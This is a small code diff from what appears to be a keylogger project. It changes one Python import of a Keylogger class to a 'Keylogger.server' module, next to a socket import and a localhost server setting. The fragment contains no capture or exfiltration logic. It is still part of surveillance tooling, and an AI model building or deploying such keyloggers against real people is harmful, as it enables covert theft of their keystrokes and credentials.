@@ -1,5 +1,5 @@
 import socket
-from keylogger import Keylogger
+from Keylogger.server import Keylogger
 
 # Server configuration local
 HOST = 'localhost'
